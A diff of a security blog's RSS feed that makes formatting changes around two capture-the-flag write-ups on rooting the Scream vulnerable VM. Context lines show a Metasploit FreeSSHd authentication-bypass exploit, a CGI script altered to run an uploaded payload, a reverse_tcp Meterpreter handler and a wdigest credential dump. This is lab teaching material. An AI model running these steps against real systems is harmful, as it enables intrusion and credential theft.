@@ -1,12 +1,11 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>Scream on rastamouse.me</title>
-    <link>https://rastamouse.me/tags/scream/</link>
-    <description>Recent content in Scream on rastamouse.me</description>
+    <title>scream on rastamouse.me</title>
+    <link>https://rastamouse.me/tags/scream/index.xml</link>
+    <description>Recent content in scream on rastamouse.me</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Fri, 16 May 2014 00:00:00 +0000</lastBuildDate>
     <atom:link href="https://rastamouse.me/tags/scream/index.xml" rel="self" type="application/rss+xml" />
     
     <item>
@@ -15,13 +14,13 @@
       <pubDate>Fri, 16 May 2014 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2014/scream-method-1/</guid>
-      <description>
-
-&lt;p&gt;Scream is a vulnerable VM running Windows XP SP2, created with the Scream VulnInjector from VulnHub.&lt;/p&gt;
+      <description>&lt;p&gt;Scream is a vulnerable VM running Windows XP SP2, created with the Scream VulnInjector from VulnHub.&lt;/p&gt;
 
 &lt;p&gt;Whilst doing this challenge, I found two methods of gaining SYSTEM.  The first was very straight-forward and rather short, which is why I also chose to publish the longer / harder method.&lt;/p&gt;
 
-&lt;h2 id=&#34;nmap:c150a9147d793c0d75f30b58e4630592&#34;&gt;Nmap&lt;/h2&gt;
+&lt;p&gt;&lt;/p&gt;
+
+&lt;h2 id=&#34;nmap&#34;&gt;Nmap&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -sV -A 192.168.127.130
  
@@ -50,7 +49,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 &lt;p&gt;I Googled the SSH Service Banner and the very first result mentioned a &amp;lsquo;FreeSSHD Remote Authentication Bypass Zeroday Exploit&amp;rsquo;, for which a Metapsloit Module was available.&lt;/p&gt;
 
-&lt;h2 id=&#34;metasploit:c150a9147d793c0d75f30b58e4630592&#34;&gt;Metasploit&lt;/h2&gt;
+&lt;h2 id=&#34;metasploit&#34;&gt;Metasploit&lt;/h2&gt;
 
 &lt;p&gt;Fire up &lt;code&gt;msfconsole&lt;/code&gt;&amp;hellip;&lt;/p&gt;
 
@@ -99,8 +98,7 @@ msf exploit(freesshd_authbypass) &amp;gt; exploit
  
 meterpreter &amp;gt; getuid
 Server username: NT AUTHORITY\SYSTEM
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
     <item>
@@ -109,13 +107,13 @@ Server username: NT AUTHORITY\SYSTEM
       <pubDate>Fri, 16 May 2014 00:00:00 +0000</pubDate>
       
       <guid>https://rastamouse.me/writeups/2014/scream-method-2/</guid>
-      <description>
+      <description>&lt;p&gt;&lt;/p&gt;
 
-&lt;h2 id=&#34;ftp:ed63a6c7e568009db84b215907f6385d&#34;&gt;FTP&lt;/h2&gt;
+&lt;h2 id=&#34;ftp&#34;&gt;FTP&lt;/h2&gt;
 
 &lt;p&gt;As we can see from the original &lt;code&gt;Nmap&lt;/code&gt; scan in Method 1, there is an FTP service which allows anonymous read access to part of the file system.  Peeking inside the &lt;code&gt;bin&lt;/code&gt; and &lt;code&gt;root&lt;/code&gt; folders, gives us a good indication that this where the &lt;code&gt;TinyWeb&lt;/code&gt; service is running, however we have no write access.&lt;/p&gt;
 
-&lt;h2 id=&#34;tftp:ed63a6c7e568009db84b215907f6385d&#34;&gt;TFTP&lt;/h2&gt;
+&lt;h2 id=&#34;tftp&#34;&gt;TFTP&lt;/h2&gt;
 
 &lt;p&gt;A UDP &lt;code&gt;Nmap&lt;/code&gt; scan showed the port 69 (TFTP) may be open.&lt;/p&gt;
 
@@ -157,7 +155,7 @@ drwxr-xr-x 1 ftp ftp              0 Feb 08  2013 cgi-bin
 &lt;/figure&gt;
 &lt;/div&gt;
 
-&lt;h2 id=&#34;tinyweb-cgi:ed63a6c7e568009db84b215907f6385d&#34;&gt;TinyWeb CGI&lt;/h2&gt;
+&lt;h2 id=&#34;tinyweb-cgi&#34;&gt;TinyWeb CGI&lt;/h2&gt;
 
 &lt;p&gt;I went and downloaded TinyWeb from RITLabs and found that within their download package, they had some example files for CGI applications.&lt;/p&gt;
 
@@ -179,7 +177,7 @@ Hello, World!
 change line --&amp;gt; print `exploit.exe`;
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;payload:ed63a6c7e568009db84b215907f6385d&#34;&gt;Payload&lt;/h2&gt;
+&lt;h2 id=&#34;payload&#34;&gt;Payload&lt;/h2&gt;
 
 &lt;p&gt;Now to make the exploit, but there&amp;rsquo;s an added complication.  I found that normal PE32 executables created by msfpayload would not execute on the remote host, and if you examine the doscgi.exe file (in the cgi examples in the tinyweb download) you can see it&amp;rsquo;s an MS-DOS executable.&lt;/p&gt;
 
@@ -211,7 +209,7 @@ root@kali:~# file exploit.exe
 exploit.exe: MS-DOS executable, MZ for MS-DOS
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;upload-and-execute:ed63a6c7e568009db84b215907f6385d&#34;&gt;Upload and Execute&lt;/h2&gt;
+&lt;h2 id=&#34;upload-and-execute&#34;&gt;Upload and Execute&lt;/h2&gt;
 
 &lt;p&gt;Upload these two files via TFTP, then start the Metasploit Multi Hander.&lt;/p&gt;
 
@@ -231,7 +229,7 @@ root@kali:~# msfcli multi/handler payload=windows/meterpreter/reverse_tcp lhost=
 [*] Meterpreter session 1 opened (192.168.127.127:4444 -&amp;gt; 192.168.127.130:1034)
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h2 id=&#34;post-exploitation:ed63a6c7e568009db84b215907f6385d&#34;&gt;Post Exploitation&lt;/h2&gt;
+&lt;h2 id=&#34;post-exploitation&#34;&gt;Post Exploitation&lt;/h2&gt;
 
 &lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; getuid
 Server username: SCREAM\alex
@@ -253,8 +251,7 @@ meterpreter &amp;gt; wdigest
 [*] Migration completed successfully.
 meterpreter &amp;gt; getuid
 Server username: NT AUTHORITY\SYSTEM
-&lt;/code&gt;&lt;/pre&gt;
-</description>
+&lt;/code&gt;&lt;/pre&gt;</description>
     </item>
     
   </channel>
